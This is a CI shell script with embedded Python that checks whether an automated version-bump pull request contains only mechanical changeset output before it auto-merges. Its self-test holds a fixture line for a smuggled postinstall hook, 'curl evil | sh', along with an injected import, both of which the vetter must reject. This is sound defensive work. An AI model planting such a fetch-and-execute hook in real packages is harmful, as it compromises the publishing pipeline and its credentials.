#!/usr/bin/env bash
#
# verify-version-pr-scope.sh — assert a Version Packages PR contains only
# mechanical `changeset version` output before an unattended merge.
#
# Two layers, both fail-closed:
#   1. Path allowlist: consumed changesets (.changeset/*.md), per-package
#      package.json / CHANGELOG.md, and each package's committed gen:version
#      output (see publish.yaml's `pnpm run version` note). No root
#      package.json (private, unversioned), no lockfile (workspace:* deps
#      don't touch it). The gen:version output paths are DERIVED, not
#      hard-coded: for every packages/*/package.json with a
#      `"gen:version": "node <script>.mjs"` script, the path that script
#      passes to `writeFileSync(join(root, '<path>'))` is allowed. A
#      hard-coded `src/version.ts` broke every train run once #102 moved the
#      file to src/mcp/version.ts. The derivation reads the trusted checkout
#      (the train checks out main, not the PR branch), and a PR that edits a
#      generator is itself outside the allowlist. Unparseable generator →
#      its output is not allowed (fail closed).
#   2. Content vet for package.json: paths alone are not enough — a smuggled
#      `"postinstall"` script in packages/*/package.json passes a path check,
#      survives `pnpm install --frozen-lockfile` (script-only edits don't
#      desync the lockfile), and executes inside the publish job where the
#      npm OIDC id-token is in scope. So every changed line in a package.json
#      must be a version bump or an internal @openrouter/* dependency range
#      bump — exactly what `changeset version` emits (cf. Version PR #57).
#      The generated version file gets the same treatment: every changed line must match
#      the fixed gen-version.mjs output shape (comments or the PACKAGE_VERSION
#      constant), so a smuggled statement can't ride the auto-merge either.
#
# File list is paginated via the REST API: `gh pr view --json files` caps at
# 100 entries and sorts .changeset/ first, so a padded PR could hide an
# out-of-scope file past the page boundary.
#
# Usage: verify-version-pr-scope.sh             (vet PR $PR in $REPO)
#        verify-version-pr-scope.sh --self-test (offline; run in CI)
# Inputs (env): PR, REPO required; GH_TOKEN for gh.
# Output: "head_sha=<sha>" on stdout (the head this check vetted).
# Exit: 0 = in scope; 1 = out of scope or the diff could not be read, with
# offending entries on stderr.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"

# The vetter reads compare-API file entries ({filename, patch}) as NDJSON on
# stdin. With VET_MODE=list it instead prints the derived generated version
# file paths, one per line.
read -r -d '' VETTER <<'PY' || true
import json, os, re, sys
from pathlib import Path

def generated_version_files(root):
    out = set()
    for pkg_json in sorted(Path(root, "packages").glob("*/package.json")):
        pkg_dir = pkg_json.parent
        try:
            script = json.loads(pkg_json.read_text()).get("scripts", {}).get("gen:version", "")
        except (OSError, ValueError, AttributeError):
            continue
        m = re.fullmatch(r"\s*node\s+([\w./-]+\.mjs)\s*", script if isinstance(script, str) else "")
        if not m or ".." in m.group(1).split("/"):
            continue
        try:
            src = (pkg_dir / m.group(1)).read_text()
        except OSError:
            continue
        for rel in re.findall(r"writeFileSync\(\s*join\(\s*root\s*,\s*['\"]([\w./-]+\.ts)['\"]\s*\)", src):
            if ".." in rel.split("/"):
                continue
            out.add(f"packages/{pkg_dir.name}/{rel}")
    return out

GENERATED = generated_version_files(os.environ["REPO_ROOT"])
if os.environ.get("VET_MODE") == "list":
    print("\n".join(sorted(GENERATED)))
    sys.exit(0)

BASE_ALLOW = re.compile(r"^(\.changeset/[^/]+\.md|packages/[^/]+/(package\.json|CHANGELOG\.md))$")
# The only lines `changeset version` changes in a package.json: the version
# field, and internal dependency ranges when updateInternalDependencies fires.
OK_LINE = re.compile(
    r"^[+-]\s*\"(version|@openrouter/[A-Za-z0-9._-]+)\":\s*\"[^\"]*\",?\s*$"
)
# gen-version.mjs emits a fixed 5-line file; a version bump only rewrites the
# string literal in the constant. Allow comment lines, the blank line, and the
# constant itself.
OK_VERSION_TS_LINE = re.compile(
    r"^[+-]\s*(//.*|/\*\*.*\*/|export const PACKAGE_VERSION = '[^']+';)?\s*$"
)

bad = []
for raw in sys.stdin:
    raw = raw.strip()
    if not raw:
        continue
    f = json.loads(raw)
    name = f["filename"]
    is_gen = name in GENERATED
    if not (is_gen or BASE_ALLOW.match(name)):
        hint = ""
        if name.endswith("version.ts"):
            hint = f" (derived gen:version outputs: {', '.join(sorted(GENERATED)) or 'none'})"
        bad.append(f"path outside allowlist: {name}{hint}")
        continue
    if is_gen or name.endswith("package.json"):
        ok_line = OK_VERSION_TS_LINE if is_gen else OK_LINE
        patch = f.get("patch")
        if patch is None:
            # No inline patch (file too large / binary flag) — cannot vet.
            bad.append(f"unvettable diff: {name}")
            continue
        for line in patch.splitlines():
            if line.startswith(("+++", "---")) or not line.startswith(("+", "-")):
                continue
            if not ok_line.match(line):
                bad.append(f"non-version change in {name}: {line[:100]}")
                break

if bad:
    for b in bad:
        print(f"::error::{b}", file=sys.stderr)
    sys.exit(1)
print("Diff scope OK — only mechanical changeset version output.", file=sys.stderr)
PY

# --self-test: offline check of the vetter against this checkout (no gh, no
# network). Runs in CI so a generator move like #102 fails the PR that makes
# it instead of every subsequent unattended train run.
if [ "${1:-}" = "--self-test" ]; then
  vet() { REPO_ROOT="$REPO_ROOT" python3 -c "$VETTER" 2>/dev/null; }
  entry() {
    python3 -c 'import json,sys; print(json.dumps({"filename":sys.argv[1],"patch":sys.argv[2]}))' "$1" "$2"
  }
  fail=0
  expect() { # expect <pass|fail> <description> <ndjson>
    local got
    if printf '%s\n' "$3" | vet; then got=pass; else got=fail; fi
    if [ "$got" = "$1" ]; then
      echo "ok   - $2"
    else
      echo "FAIL - $2 (expected $1, got $got)"
      fail=1
    fi
  }

  GEN_FILES="$(VET_MODE=list REPO_ROOT="$REPO_ROOT" python3 -c "$VETTER" </dev/null)"
  if [ -z "$GEN_FILES" ]; then
    echo "FAIL - no gen:version output paths derived from packages/*/package.json"
    exit 1
  fi
  while IFS= read -r gen; do
    if [ -f "$REPO_ROOT/$gen" ]; then
      echo "ok   - derived $gen exists"
    else
      echo "FAIL - derived $gen does not exist"
      fail=1
    fi
    expect pass "$gen: PACKAGE_VERSION bump" "$(entry "$gen" "$(printf '%s\n' \
      '@@ -5 +5 @@' \
      "-export const PACKAGE_VERSION = '0.11.0';" \
      "+export const PACKAGE_VERSION = '1.0.0';")")"
    expect fail "$gen: smuggled statement" "$(entry "$gen" "+import 'evil';")"
  done <<< "$GEN_FILES"

  expect pass "changeset + CHANGELOG + package.json version bump" "$(printf '%s\n' \
    "$(entry .changeset/some-change.md '-x')" \
    "$(entry packages/agent/CHANGELOG.md '+## 1.0.0')" \
    "$(entry packages/agent/package.json "$(printf '%s\n' '-  "version": "0.11.0",' '+  "version": "1.0.0",')")")"
  expect fail "package.json postinstall smuggle" \
    "$(entry packages/agent/package.json '+    "postinstall": "curl evil | sh",')"
  expect fail "source file outside allowlist" "$(entry packages/agent/src/index.ts '+x')"
  expect fail "non-generated version.ts" \
    "$(entry packages/agent/src/version.ts "+export const PACKAGE_VERSION = '1.0.0';")"
  expect fail "generator edit" "$(entry packages/agent/scripts/gen-version.mjs '+x')"
  exit "$fail"
fi

: "${PR:?PR is required}"
: "${REPO:?REPO is required}"

PR_INFO="$(gh pr view "$PR" -R "$REPO" --json headRefOid,baseRefName,changedFiles)"
HEAD_SHA="$(echo "$PR_INFO" | python3 -c 'import sys,json; print(json.load(sys.stdin)["headRefOid"])')"
BASE_REF="$(echo "$PR_INFO" | python3 -c 'import sys,json; print(json.load(sys.stdin)["baseRefName"])')"
DECLARED="$(echo "$PR_INFO" | python3 -c 'import sys,json; print(json.load(sys.stdin)["changedFiles"])')"

# Vet the diff of the immutable SHA itself (compare API), not "the PR's
# current files": with the mutable pulls/N/files endpoint, an A→B→A flip-flop
# timed inside this script could get files from revision B vetted while
# head_sha reports A. compare/<base>...<sha> is cryptographically bound to
# HEAD_SHA, so what we vet is exactly what the caller pins and merges
# (pr-gate.sh passes it to --match-head-commit).
FILES_NDJSON="$(gh api "repos/${REPO}/compare/${BASE_REF}...${HEAD_SHA}" \
  --jq '.files[] | {filename, patch}')"

echo "head_sha=${HEAD_SHA}"

if [ -z "$FILES_NDJSON" ]; then
  echo "::error::Could not read diff for ${HEAD_SHA:0:7} (empty) — refusing" >&2
  exit 1
fi

# The compare endpoint caps the files array (~300), so a padded PR could hide
# an out-of-scope path past the cap. Cross-check against the PR's own
# changed-files count and refuse on any mismatch — covers truncation AND a
# base that moved enough to skew the diff. (A real Version PR is small; a
# false refusal here just goes red and re-vets on re-run.)
ENUMERATED="$(printf '%s\n' "$FILES_NDJSON" | grep -c .)"
if [ "$ENUMERATED" != "$DECLARED" ]; then
  echo "::error::Diff for ${HEAD_SHA:0:7} enumerated ${ENUMERATED} files but PR declares ${DECLARED} — refusing" >&2
  exit 1
fi

printf '%s\n' "$FILES_NDJSON" | REPO_ROOT="$REPO_ROOT" python3 -c "$VETTER"
